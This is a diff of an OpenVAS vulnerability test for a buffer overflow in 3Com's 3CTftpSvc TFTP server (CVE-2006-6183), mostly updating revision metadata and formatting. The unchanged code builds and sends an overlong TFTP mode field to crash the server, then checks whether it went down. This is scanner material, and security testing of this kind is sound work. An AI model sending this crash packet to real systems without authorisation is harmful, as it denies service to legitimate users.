@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_3ctftpsvc_tftp_server_mode_bof_vuln.nasl 8237 2017-12-22 10:33:02Z cfischer $
+# $Id: gb_3ctftpsvc_tftp_server_mode_bof_vuln.nasl 11167 2018-08-30 12:04:11Z asteins $
 #
 # 3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability
 #
@@ -27,20 +27,20 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802658");
-  script_version("$Revision: 8237 $");
+  script_version("$Revision: 11167 $");
   script_cve_id("CVE-2006-6183");
   script_bugtraq_id(21301, 21322);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-12-22 11:33:02 +0100 (Fri, 22 Dec 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-30 14:04:11 +0200 (Thu, 30 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-07-10 15:15:15 +0530 (Tue, 10 Jul 2012)");
   script_name("3CTftpSvc TFTP Server Long Mode Buffer Overflow Vulnerability");
 
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/23113");
-  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/30545");
-  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2006120002");
-  script_xref(name : "URL" , value : "http://support.3com.com/software/utilities_for_windows_32_bit.htm");
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/452754/100/0/threaded");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/23113");
+  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/30545");
+  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2006120002");
+  script_xref(name:"URL", value:"http://support.3com.com/software/utilities_for_windows_32_bit.htm");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/452754/100/0/threaded");
 
   script_category(ACT_DENIAL);
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
@@ -48,20 +48,19 @@ if(description)
   script_dependencies("tftpd_detect.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
 
-  script_tag(name : "impact" , value : "Successful exploitation will allow attackers to cause the
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause the
   application to crash, denying further service to legitimate users.
 
   Impact Level: Application");
-  script_tag(name : "affected" , value : "3Com 3CTFTPSvc TFTP Server version 2.0.1");
-  script_tag(name : "insight" , value : "The flaw is due to a boundary error during the processing of
+  script_tag(name:"affected", value:"3Com 3CTFTPSvc TFTP Server version 2.0.1");
+  script_tag(name:"insight", value:"The flaw is due to a boundary error during the processing of
   TFTP Read/Write request packet types. This can be exploited to cause a stack
   based buffer overflow by sending a specially crafted packet with an overly
   long mode field.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "This host is running 3CTftpSvc TFTP Server and is prone to buffer
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"This host is running 3CTftpSvc TFTP Server and is prone to buffer
   overflow vulnerability.");
 
   script_tag(name:"qod_type", value:"exploit");
@@ -73,13 +72,11 @@ if(description)
 
 include("tftp.inc");
 
-## Get TFTP Port
 port = get_kb_item("Services/udp/tftp");
 if(!port){
   port = 69;
 }
 
-## Check TFTP Port Status
 if(! tftp_alive(port:port)){
   exit(0);
 }
@@ -90,7 +87,6 @@ if(!soc){
   exit(0);
 }
 
-## Construct the attack request with long transporting mode
 mode = "netascii" + crap(data: "A", length: 469);
 attack = raw_string(0x00, 0x02) +       ## Write Request
          "A" + raw_string(0x00) +       ## Source File Name
@@ -103,7 +99,6 @@ close(soc);
 
 sleep(2);
 
-## Check TFTP Server is alive or not
 if(!tftp_alive(port:port)) {
   security_message(port:port,proto:"udp");
   exit(0);
